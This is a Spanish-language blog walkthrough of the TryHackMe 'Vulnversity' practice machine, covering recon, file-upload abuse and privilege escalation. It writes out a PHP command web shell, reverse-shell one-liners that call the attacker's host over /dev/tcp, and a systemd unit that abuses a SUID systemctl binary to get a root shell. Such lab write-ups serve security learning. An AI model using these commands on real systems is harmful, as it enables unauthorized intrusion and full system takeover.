---
layout: single
title: Vulnversity - TryHackMe
excerpt: " This machine mainly focused on active recon, web app attacks, and privilege escalation. "
date: 2022-10-15
classes: wide
header:
  teaser: /blog/assets/images/thm-writeup-vulnversity/vulnversity.png
  teaser_home_page: true
  icon: /blog/assets/images/tryhackme.webp
categories:
  - tryhackme
tags:  
  - php
  - suid
  - systemctl
---

This machine mainly focused on active recon, web app attacks, and privilege escalation.

# Summary
- IP: 10.10.129.26
- Ports: 21,22,139,445,3128,3333
- OS: Linux (Ubuntu)
- Services & Applications:
	-  21 -> vsftpd 3.0.3
	-  22 -> OpenSSH 7.2p2 Ubuntu 4ubuntu2.7
	-  139 -> Samba smbd 3.X - 4.X
	-  445 -> Samba smbd 4.3.11-Ubuntu
	-  3128 -> Squid http proxy 3.5.12
	-  3333 -> Apache httpd 2.4.18

# Recon

- Escaneo básico de puertos:

```bash
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.129.26 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$sudo nmap -p21,22,139,445,3128,3333 -sCV 10.10.129.26 -oN targeted
```

- Escaneo de directorios:

```bash
$gobuster dir -u http://10.10.54.172:3333/ -w /home/dante/SecLists/Discovery/Web-Content/common.txt -t 100

$gobuster dir -u http://10.10.54.172:3333/internal -w /home/dante/SecLists/Discovery/Web-Content/common.txt -t 100
```

- Nos encontramos el directorio "internal" el cuas nos permite subida de archivos, aprovechamos e intentamos subir un PHP malicioso, sin embargo no se permite la extension php, probamos con todas las demás variantes y funciona con la extensión "phtml":

```bash
$nano shell.phtml

<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

- Lo subimos y accedemos a él desde el directorio /internal/uploads, ejecutamos una reverse shell básica mediante el parámetro "cmd" en la url:

http://10.10.54.172:3333/internal/uploads/cmd.phtml?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.18.101.123/443%200%3E%261%22

- Hacemos tratamiento de la tty y obtenemos primera flag.

# ESCALANDO PRIVILEGIOS:

- Buscamos binarios con permisos SUID:

 ```bash
 find / -perm -4000 2>/dev/null
 ```

- Encontramos un binario clave "/bin/systemctl", con una búsqueda encontramos la manera de poder aprovecharlo para ganar privilegios [Privilege Escalation: Systemctl (Misconfigured Permissions — sudo/SUID) (github.com)](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740)

- Creamos un archivo "root.service" con el siguiente contenido:

```
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KaliIP/9999 0>&1'

[Install]
WantedBy=multi-user.target
```


- Luego ejecutamos los siuientes comandos estando en escucha en la máquina atacante:

```bash
/bin/systemctl enable /dev/shm/root.service
Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /dev/shm/root.service
Created symlink from /etc/systemd/system/root.service -> /dev/shm/root.service
```

```bash
/bin/systemctl start root
```

- Accedemos como root y obtenemos la última flag.
